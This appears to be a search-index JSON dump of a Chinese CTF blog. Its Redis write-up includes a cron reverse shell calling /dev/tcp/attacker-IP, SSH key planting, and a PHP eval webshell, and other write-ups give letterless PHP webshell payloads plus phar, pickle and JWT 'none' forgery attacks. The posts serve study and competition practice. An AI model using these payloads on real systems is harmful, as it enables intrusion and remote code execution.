[{"categories":["心路历程"],"content":" 前几天猛然发现自己的博客已经好多天没更新了，翻了一圈发现博客源码也被我弄丢了，由于不想再配一遍 Hexo 和依赖的各种库（其实就是懒，索性直接把博客迁移到了 Hugo ","date":"2021-05-31","objectID":"/posts/blog-migration/:0:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x00 安装 Hugo Windows 用户只能说 Scoop 真香 scoop install hugo-extended 至于为什么要安装 extened 版本，其实我最开始装的是另一个版本，然后发现好多主题都用不了，比如普通版本就没有 scss 支持，Google 了一圈才发现需要装 extended 顺带一提，原来 Hugo 的 Stars 已经超过 Jekyll 了 ","date":"2021-05-31","objectID":"/posts/blog-migration/:1:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x01 选主题 众所周知，搭博客最难的一步是选一个好看的主题（曾经因为没找到好看的主题而放弃了 Wordpress 把官方的主题列表翻了个底朝天，最后选了这个最符合我审美的 LoveIt，国人开发的，还是中文文档看着舒服 简单看了一下介绍，功能挺齐全的，搜索评论这些功能都是开箱即用，还记得之前 Hexo 那个主题为了加个搜索功能自己改了半天模板 主题的文档写的挺全面的，各个配置项都有明确的介绍，用到什么就到文档里搜索一下就好，这里说两个文档里没有涉及到的问题 ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"Algolia Search 的配置 在博客里配置基于 Algolia 的搜索功能只需要在配置文件里加几个相关的配置项就可，这里说一下将生成的 json 上传到 Algolia 以应用搜索的操作 这里博客的作者推荐了一个基于 nodejs 的库 Algolia Atomic，由于懒得配 nodejs 而且 Algolia 官方 API 其实非常完善，我就直接用 python 糊了一个小脚本，由于我把博客的部署直接放到了 Github Action 上，所以就约等于每次部署都自动上传了，这里就随便放一下糊出来的脚本 from algoliasearch.search_client import SearchClient import json import os import sys def read_json(filename: str) -\u003e list: with open(filename, 'r', encoding='utf-8') as file: return json.load(file) def main(): if len(sys.argv) != 2: print(\"Filename is needed.\") exit(1) filename = sys.argv[1] ALGOLIA_APPID = os.getenv('ALGOLIA_APPID') ALGOLIA_ADMIN_KEY = os.getenv('ALGOLIA_ADMIN_KEY') ALGOLIA_INDEX = os.getenv('ALGOLIA_INDEX') if ALGOLIA_APPID == None or ALGOLIA_ADMIN_KEY == None or ALGOLIA_INDEX == None: print(\"APPID and ADMIN_KEY and INDEX is needed.\") exit(1) client = SearchClient.create(ALGOLIA_APPID, ALGOLIA_ADMIN_KEY) index = client.init_index(ALGOLIA_INDEX) print(\"=== Clear Objects ===\") res = index.clear_objects() print(res.raw_responses) objects = read_json(filename) print(\"=== Add Objects ===\") res = index.save_objects(objects, {'autoGenerateObjectIDIfNotExist': True}) print(res.raw_responses) if __name__ == '__main__': main() ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:1","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"文章的加密 有的时候写的博客不想被别人看到怎么办呢，加密一下就好了 文章的加密对于基于 nodejs 这种脚本语言的 Hexo 来说简直轻而易举，npm 装个插件就完事了 但是 Hugo 是用 Golang 写的，没有那么好的插件化操作，找了一下找到了这个 Hugo Encryptor，还是 Vidar 的 Web 大佬写的（我直接膜 只是需要每次 build 之后多运行一个脚本，Github Action 加一行就好了 ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:2","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x02 自动化部署 Hugo 的官方文档贴心的提供了 Github Action 部署的详细文档，我就在它的基础上稍作修改，一个是多运行了一些脚本（文章加密、上传 json），还有就是我的博客源码和 Github Pages 放在了不同仓库，需要推送到另一个仓库 这里把我的 workflow 配置也贴一下吧（随便糊的，大佬轻喷 name:Blogon:push:branches:- masterjobs:deploy:runs-on:ubuntu-18.04steps:- uses:actions/checkout@v2with:submodules:truefetch-depth:0- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:'latest'extended:true- name:Setup Othersrun:|sudo apt install python3 pip3 install --upgrade 'algoliasearch\u003e=2.0,\u003c3.0' --user pip3 install setuptools --user pip3 install -r plugins/hugo_encryptor/requirements.txt --user- name:Buildenv:ALGOLIA_ADMIN_KEY:${{ secrets.ALGOLIA_ADMIN_KEY }}ALGOLIA_APPID:${{ secrets.ALGOLIA_APPID }}ALGOLIA_INDEX:${{ secrets.ALGOLIA_INDEX }}run:|hugo python3 plugins/hugo_encryptor/hugo-encryptor.py python3 plugins/algolia_upload/upload.py public/index.json- name:Deployuses:peaceiris/actions-gh-pages@v3with:deploy_key:${{ secrets.ACTIONS_DEPLOY_KEY }}external_repository:X5tar/x5tar.github.iopublish_branch:masterpublish_dir:./publicfull_commit_message:${{ github.event.head_commit.message }} ","date":"2021-05-31","objectID":"/posts/blog-migration/:3:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x03 尾记 这次迁移整体没遇到什么障碍，加起来也就不到两个小时就完成了，而且主要时间都用在选主题和复制粘贴原来的文章了，以后遇到什么问题再来更吧 溜了溜了，明天就考密码学了现在还没学完（ ","date":"2021-05-31","objectID":"/posts/blog-migration/:4:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":null,"content":"大佬们的博客（膜 Neorah：https://neorah.me/ evi0s：https://evi0s.com/ enivs0rt：https://enivs0rt.github.io/ 戳戳龙：https://ccdragon.cc/ 木偶：https://muouim.github.io/ ","date":"2021-05-31","objectID":"/friends/:0:0","tags":null,"title":"🌟's Friends","uri":"/friends/"},{"categories":null,"content":"自我介绍（迫真 某男子职业技术学院在读 CNSS / CTFer / WEB🐶 跟随大佬们脚步的菜鸡 业余代码搬运工 LOL 最强黑铁，0 / 21 / 0 ","date":"2021-05-31","objectID":"/about/:0:0","tags":null,"title":"About 🌟","uri":"/about/"},{"categories":["WEB"],"content":"0x00 前言 刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:1:0","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x01 Redis 介绍 Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库 Redis 通常将全部的数据存储在内存中，但也可以将数据持久化存储在硬盘中（数据持久化给了我们利用的机会） ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:2:0","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x02 环境搭建 安装 redis 后，在配置文件 redis.conf 中 bind 127.0.0.1 ::1 一行前加 # 将其注释，并将 protected-mode 设为 no ，然后启动 redis-server 然后在攻击机上输入 redis-cli -h 目标IP 命令连接目标机器的 redis-server，若连接成功则环境搭建完成 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:3:0","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x03 利用方法 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:0","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"1. 利用 Cron 定时任务反弹 shell 关于 Linux Cron 定时任务见另一篇博客 [Linux Cron 定时任务](https://x5tar.com/2020/06/21/linux-crontab/) 本方法适用于目标机器以 root 身份启动 Redis 的情况 先在攻击机上监听任意端口 nc -lvvp Port 然后在连接的 redis-cli 执行以下命令（第一行命令可以换为其它任何可以反弹 shell 的命令） \u003e set x \"\\n* * * * * bash -i \u003e\u0026 /dev/tcp/攻击机IP/Port 0\u003e\u00261\\n\" OK \u003e config set dir /var/spool/cron/ OK \u003e config set dbfilename root OK \u003e save OK 稍等片刻即可在攻击机接收到回弹的 shell 若长时间未接收到，可尝试将第二行命令中的目录改为 /var/spool/cron/crontabs 再次尝试 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:1","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"2. 写入公钥并利用 ssh 连接 本方法适用于目标机器安装并启动了 ssh server 的情况 使用本方法需要知道启动 redis 的用户的 home 目录 先在攻击机生成 ssh 公钥（已存在公钥无需重复生成，防止覆盖） ssh-keygen -t rsa 然后在 ~/.ssh 目录下执行以下命令 (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") | redis-cli -h 目标机器IP -x set x 然后在连接的 redis-cli 执行以下命令（此处假设用户为 root，home 目录为 /home） \u003e config set dir /root/.ssh OK \u003e config set dbfilename authorized_keys OK \u003e save OK 然后在攻击机通过 ssh 连接目标机器即可 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:2","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"3. 写入 webshell 本方法适用于 redis 用户权限较低但对 web 目录有写权限的情况 使用本方法需要知道 web 目录的绝对路径 在连接的 redis-cli 执行以下命令（此处假设目标机器运行 PHP） \u003e set x \"\\n\u003c?php eval($_POST['cmd']); ?\u003e\\n\" OK \u003e config set dir /var/www/html OK \u003e config set dbfilename evil.php OK \u003e save OK 然后连接 webshell 即可 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:3","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"4. 利用 lua 脚本进行操作 在其它地方看到的，但是在 Redis 里甚至连 IO 库和 OS 库都不能用，暂未发现可靠的利用方法 从 Redis 2.6.0 版本开始，Redis 内置了 lua 解释器，可以通过 lua 脚本进行一些操作 \u003e eval \"return 'hello'\" 0 \"hello\" ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:4","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"5. 其它方法 既然通过 Redis 未授权访问获得了写入文件的权限，则可根据目标机器启动的服务，针对性的使用其它方法进行进一步渗透 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:5","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x04 安全配置 Redis 未授权访问危害较大，故根据以上利用方法，可针对性的进行以下配置，增强安全性 仅绑定部分地址，限制可访问的 IP 修改 Redis 监听端口 为用户设置密码 以单独的低权限用户启动 Redis，并禁止登录 禁止使用或修改高危命令名称（rename-command） ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:5:0","tags":["WEB安全","Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["杂事"],"content":"0x00 前言 在做一道涉及到 redis 未授权访问的题的时候，看到了使用到 /var/spool/cron/ 目录反弹 shell 后查询得知 Linux Cron 定时任务，在此记录下来 ","date":"2020-06-21","objectID":"/posts/linux-crontab/:1:0","tags":["Linux"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["杂事"],"content":"0x01 相关文件 与 Cron 相关的文件主要存在以下几个目录 /var/spool/cron/ 目录下存放的是每个用户的 crontab 任务，每个任务以创建者的名字命名 /etc/crontab 这个文件负责调度各种管理和维护任务 /etc/cron.d/ 这个目录用来存放任何要执行的 crontab 文件或脚本 我们还可以把脚本放在/etc/cron.hourly 、 /etc/cron.daily 、 /etc/cron.weekly 、 /etc/cron.monthly 目录中，让它每小时/天/星期/月执行一次 其中 /var/spool/cron/ 为最常用的脚本存放位置，一般由 crontab 命令操作 ","date":"2020-06-21","objectID":"/posts/linux-crontab/:2:0","tags":["Linux"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["杂事"],"content":"0x02 Crontab 命令操作 查看 crontab 命令的帮助如下 Usage: crontab [options] file crontab [options] crontab -n [hostname] Options: -u \u003cuser\u003e define user -e edit user's crontab -l list user's crontab -r delete user's crontab -i prompt before deleting -n \u003chost\u003e set host in cluster to run users' crontabs -c get host in cluster to run users' crontabs -V print version and exit -x \u003cmask\u003e enable debugging 其中常用的选项有 -e 、 -l 、 -r -e 用于编辑配置文件（即使用默认编辑器编辑 /var/spool/cron/$USER 文件） -l 用于读取配置文件（即显示 /var/spool/cron/$USER 文件内容） -r 用于删除配置文件（即删除 /var/spool/cron/$USER 文件） ","date":"2020-06-21","objectID":"/posts/linux-crontab/:3:0","tags":["Linux"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["杂事"],"content":"0x03 配置文件内容 做题过程中用到的文件为 /var/spool/cron/root 注意： /var/spool/cron/ 目录所有者为 root，权限为 755，只有 root 用户才能创建文件 但 crontab 生成的配置文件所有者为创建的用户为创建用户，权限为 600 所以只有在以 root 用户登录或当前登录用户已创建定时任务时才可直接修改该文件 写入的内容为（其中 command 即为反弹 shell 的命令） * * * * * command 该文件中一行命令由六部分组成，前五部分分别为 分、时、日、月、周，最后一部分为待执行的命令 时间部分可用的操作符有 * 所有时间 / 时间间隔 - 时间范围 , 单独的时间 所以上述写入内容为每隔一分钟执行一次 command，即可达到自动执行的目的 另附几个上述操作符的使用示例 */10 8-16 * * * command 每天的 8-16 时每 10 分钟执行一次 0,30 * * * * command 每小时的 0 分和 30 分各执行一次 0 9 */2 * * command 每隔两天的 9:00 执行一次 0,20,40 8-16 * * 6,0 command 每周六和周日的 8-16 时的 0 20 40 分各执行一次 ","date":"2020-06-21","objectID":"/posts/linux-crontab/:4:0","tags":["Linux"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["CTF"],"content":"前言 被川大的同学叫来打这个比赛 嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多… 比赛的时候就做出来一道 WEB（真的菜 ","date":"2020-05-27","objectID":"/posts/geekgame2020/:1:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"二次注入 真的是这次比赛最简单的一道题了 最常规的二次注入 先注册一个名为 admin'# 的用户，登录后修改密码 再用 admin 和修改后的密码登录即可 比赛的时候没发现有源码泄露，直接看 SQL 语句可能更直观一些 $x=$db-\u003eexecute(\"update users set password=? where username='$username' \",['s',\u0026$password]); ","date":"2020-05-27","objectID":"/posts/geekgame2020/:2:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"反序列化？ 打开是个文件上传，只能上传图片，并且有个 vulnerable.php \u003c?php highlight_file(__FILE__); if (isset($_GET['filename'])) { $filename = $_GET['filename']; } else { $filename = \"\"; } class Flag { private $code; function __destruct() { // TODO: Implement __destruct() method. eval($this-\u003ecode); } } if (file_exists($filename)) { echo \"文件存在的呢;\"; } else { echo \"啊这，文件不在哦\"; } ?\u003e 题名加了个问号，那就不是反序列化，但是还不知道怎么做 看了官方 WP，这真的涉及到我的知识盲区了 vulnerable.php 中用到了 file_exists 函数 自 PHP 5.0.0 起, 此函数也用于某些 URL 包装器 file_exists函数在检查 phar 包的时候会将其解析 用如下 payload 生成 phar 包 \u003c?php class Flag { private $code; function __construct($my_code) { $this-\u003ecode = $my_code; } function __destruct() { eval($this-\u003ecode); } } $phar = new Phar('a.phar'); $phar-\u003estartBuffering(); $phar-\u003esetStub('GIF89a\u003c?php __HALT_COMPILER();?\u003e'); $object = new Flag('eval($_REQUEST[\"cmd\"]);'); $phar-\u003esetMetadata($object); $phar-\u003eaddFromString('a.txt', 'a'); $phar-\u003estopBuffering(); 注意添加文件头绕过文件类型检测，生成后改后缀为 gif 上传，再用 phar 协议读取即可 vulnerable.php?filename=phar://upload/a.gif ","date":"2020-05-27","objectID":"/posts/geekgame2020/:3:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"ezcode 直到比赛结束只有一解的题 打开可以注册和登录，注册返回一串 JWT，刚开始毫无思路，后来给了一个 hint hint ：top1000 ？top1000 弱口令吗 跑了一下果然跑出来了 key import jwt token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw' with open('top1000.txt', 'r') as f: top1000 = [i.strip() for i in f.readlines()] for i in top1000: test_token = jwt.encode({'username':'1234'}, algorithm='HS256', key=i).decode() if test_token == token: print('Found it!') print(i) print(jwt.encode({'username':'admin'}, algorithm='HS256', key=i).decode()) break 爆破 JWT Key 并修改内容JWT \" 爆破 JWT Key 并修改内容 用生成的 JWT 登录发现还有第二关，看一下源码有注释 want2know=xxx class RestrictedUnpickler(pickle.Unpickler): blacklist = { 'sys','eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit','getattr' } def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() ... pickle_data=request.form.get('data') if pickle_data==None: return open('templates/pickle.html').read() try: pickle_data=base64.b64decode(pickle_data.encode()) op_blackli=[b'R'] for op in op_blackli: if op in pickle_data: return '数据非法！'+op.decode() data=restricted_loads(pickle_data) except Exception: return \"请输入正确的数据格式！\" try: secret=request.form.get('secret') except Exception: return open('templates/pickle.html') if want2know==secret: return flag else: return '欢迎使用HACHp1的pickle测试工具！' else: return '没有权限查看！\\n' 是一个 pickle 反序列化，只看出来禁止用 R 执行函数，然后就不会了（ 看了 WP 这里是利用 globals 或 locals 函数直接修改 want2know 使其与输入的 secret 相等 出题壬推荐用 pker 构建序列化 glo_dic=INST('builtins','globals') glo_dic['want2know']='test' return 生成 payload b\"(ibuiltins\\nglobals\\np0\\n0g0\\nS'want2know'\\nS'test'\\ns.\" base64 一下即可 ","date":"2020-05-27","objectID":"/posts/geekgame2020/:4:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"总结 第一道 WEB 比较照顾我这样的菜🐶 后两道 WEB 质量还是不错的，都涉及到了我不会的知识点 phar 和 pickle 似乎都是第一次做到 除了做不出来，体验挺不错的（ ","date":"2020-05-27","objectID":"/posts/geekgame2020/:5:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["杂事"],"content":"在做题的时候遇到了上传了 shell 脚本但是没有执行权限的情况 测试脚本 测试脚本shell \" 测试脚本 本地测试结果 没有执行权限denied \" 没有执行权限 然后就发现了 source 命令 使用 source 命令source \" 使用 source 命令 点命令（错误示范） 点命令的错误用法dot_error \" 点命令的错误用法 点命令（必须加 ./） 正确使用点命令dot \" 正确使用点命令 source 命令和点命令在作用上完全相同 而除了可以不需要执行权限外，source 命令（点命令）还有一个特性，即 source 命令是在本 shell 内执行，而 直接执行脚本是在新开 shell 中执行，即 source 命令可以设置当前 shell 的环境变量，故常用来使修改过的初始化文件（.bashrc .profile 等）立即生效 测试脚本 环境变量测试脚本env \" 环境变量测试脚本 直接执行 直接执行env_shell \" 直接执行 source 命令 使用 source 命令执行env_source \" 使用 source 命令执行 点命令 使用点命令执行env_dot \" 使用点命令执行 ","date":"2020-05-10","objectID":"/posts/source-command/:0:0","tags":["Linux"],"title":"Linux 中的 source 命令（点命令）","uri":"/posts/source-command/"},{"categories":["WEB"],"content":"0x00 前言 又是好多天没写博客了，就想着再来随便水点什么吧 这种神奇的题曾经在 CNSS Recruit 2019 Web Boss题 中出现过，最近做题又遇到了一次结果还是不会（因为又多过滤了一些符号之前的方法就也不能用了），就把它写下来吧，具体方法有三种，可以灵活使用，这里使用的是 PHP5.6 环境，具体原因会在下文说明，源码如下 \u003c?php highlight_file(__FILE__); if(!preg_match('/[a-z0-9]/is',$_GET['code'])) { eval($_GET['code']); } else { die(\"nonono!\"); } ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:1:0","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x01 前置知识（PHP 中的一些特性） 可变函数，即可以用字符串变量充当函数名（eval 等语言结构不可使用） 如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它 \u003c?php $a = 'strrev'; $b = 'Hello'; echo $a($b); // olleH 可变变量，即在一个字符串变量前再加一个 $ 可将该变量的值当作变量名 一个可变变量可以获取一个普通变量的值作为这个可变变量的变量名 \u003c?php $a = 'hello'; $$a = 'world'; echo $hello; // world $hello = 'dlrow'; echo $$a; // dlrow ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:2:0","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x02 思路分析及三种方法 我们需要将各种符号进行变换组合，最终构造出各种字母数字，以执行所需命令 大致思路为构造 assert($_POST[_]) 获取 shell 这里说一下需要使用 PHP5 的原因 PHP5 中 assert 为函数，可以通过 $a='assert';$a(...) 的方式执行，这也是之后选用 assert 而不选用 eval 的原因 PHP7 中 assert 变为了和 eval 一样的语言结构，即不能再用以上方法执行 在这篇文章结尾我也会简要分析一下在 PHP7 中怎么操作 ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:0","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"法一：异或 异或即 PHP 中的运算符 ^ $a ^ $b Xor（按位异或） 将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1 两个字符串异或后仍是字符串 这应该是这三种方法中最常用的一个（因为 Google 查到最多的是这种方法），具体选用哪些字符进行异或直接查 ASCII 码表就好（构造小写字母采用反引号 ` ，构造大写字母采用 @ 比较方便） /?code=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%10'^'@').('%0F'^'@').('%13'^'@').('%14'^'@');$___=$$__;$_($___[_]); 整理一下即为以下代码 \u003c?php $_ = 'assert'; $__ = '_POST'; $___ = $$__; $_($___[_]); // assert($_POST[_]) ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:1","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"法二：取反 取反即 PHP 中的运算符 ~ ~$a Not（按位取反） 将 $a 中为 0 的位设为 1，反之亦然 字符串取反后仍是字符串 在异或运算符 ^ 被过滤时可以考虑这种方法，也是招新 BOSS 题中用到的方法，依然查 ASCII 码表 /?code=$_=~'%9E%8C%8C%9A%8D%8B';$__=~'%AF%B0%ACAB';$___=$$__;$_($___[_]); 整理一下即与 0x02 中代码相同 另附一个将字符串转换成上述取反格式的脚本 #!/bin/python3 s = 'assert' print(\"~'\", end='') for i in s: i1 = hex(15 - int(hex(ord(i))[-2], 16))[-1].upper() i2 = hex(15 - int(hex(ord(i))[-1], 16))[-1].upper() print('%' + i1 + i2, end='') print(\"'\") # ~'%9E%8C%8C%9A%8D%8B' ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:2","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"法三：字符递增 那么如果异或运算符和取反运算符都被过滤了该怎么办呢，这里就要用到递增运算符 ++ 然而怎么获得用来递增的第一个字母，这用到了 PHP 的一个特性 在试图将数组转换成字符串时会获得字符串 ‘Array’ 可以用以下代码演示这个特性 \u003c?php $a = []; $b = \"$a\"; echo $b; // Array 又由于 PHP 中函数名对大小写不敏感，我们可以构造 ASSERT($_POST[_]) /?code=$_=[];$__=\"$_\";$___=$__['@'=='!'];$_=$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$____=$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$_____=$___;$___%2B%2B;$______=$___;$___%2B%2B;$___%2B%2B;$_______=$___;$___%2B%2B;$________=$___;$___%2B%2B;$_________=$___;$_=$_.$________.$________.$____.$_______.$_________; $__='_'.$______.$_____.$________.$_________; $___=$$__;$_($___[_]); 整理即为以下代码 \u003c?php $_ = []; $__ = \"$_\"; // Array $___ = $__['@' == '#']; // A $_ = $___; // A $___++;$___++;$___++;$___++; $____ = $___; // E $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $_____ = $___; // O $___++; $______ = $___; // P $___++;$___++; $_______ = $___; // R $___++; $________ = $___; // S $___++; $_________ = $___; // T $_ = $_.$________.$________.$____.$_______.$_________; // ASSERT $__ = '_'.$______.$_____.$________.$_________; //POST $___ = $$__; $_($___[_]); // assert($_POST[_]) ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:3","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x03 PHP7 中可用的方法 如果 web 用户有读写权限，可以直接用 file_put_content 函数将木马写入文件 如果无读写权限，可以用上述各种方法构造出自己需要的函数再执行，法三经过一定操作理论上可以构造出所有字母（大写和小写）和数字，小写字母和数字可以用以下方法再结合递增递减即可 \u003c?php $_ = []; $__ = \"$_\"; // Array $___ = $__['@' == '#']; // A $_ = $___; // A $___++;$___++;$___++; $____ = $___; // D $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $_____ = $___; // O $___++;$___++;$___++; $______ = $___; // R $_______ = $_____.$______.$____; // ORD $________ = $_______($____) - $_______($_); // 3 （数字在这） $____ = $__[$________]; // a （小写字母在这） ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:4:0","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WEB"],"content":"0x04 总结 咕了好久才想起来有篇博客没写完，结果这两天又遇到一次依然不会（就是用到了法三），跟在🐙爷爷后面做看完题才想起来，卧槽这个我看过（但是还没写 这个故事告诉我们，鸽子迟早是要被炖了的（逃 ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:5:0","tags":["WEB安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["CTF"],"content":"0x00 前言 当时比赛的时候，一共三道 WEB 题，两道 nodejs 的都不会，还有一道 PHP 没来得及看后来看了也不会（还是太菜了 趁题还热乎，借着 dalao 们的 WP 复现一波 ","date":"2020-04-22","objectID":"/posts/hfctf-web/:1:0","tags":["WriteUp"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x01 easy_login 由于静态文件的配置问题，有一大波源码泄露（比赛时只看到了这个 只有 admin 可以看到 flag，而我们不能注册名为 admin 的用户，只能想办法伪造 题目都说了错的是依赖库，比赛的时候居然没注意到，这里的关键在于用了 jsonwebtoken 库，重点在登录的代码 'POST /api/login': async (ctx, next) =\u003e { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u003c global.secrets.length \u0026\u0026 sid \u003e= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username \u0026\u0026 password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 重点在 jwt 库存在缺陷 当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过 我们只要使这里的 secret 为 undifined 或 null 即可，但 sid 不能为 undefined 或 null 测试发现，当数组索引为浮点数时，得到的结果为 undefined 数组索引为浮点数时返回 undefinedlist \" 数组索引为浮点数时返回 undefined 可以用 python 构造 token import jwt print(jwt.encode({\"secretid\":0.1,\"username\":\"admin\",\"password\":\"123\"},algorithm=\"none\",key=\"\").decode('utf-8')) 发送构造的 token 即可以 admin 身份登录，获得 flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:2:0","tags":["WriteUp"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x02 just_escape 看起来后缀是 php 实际上后端是 nodejs code=Error().stack; Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] 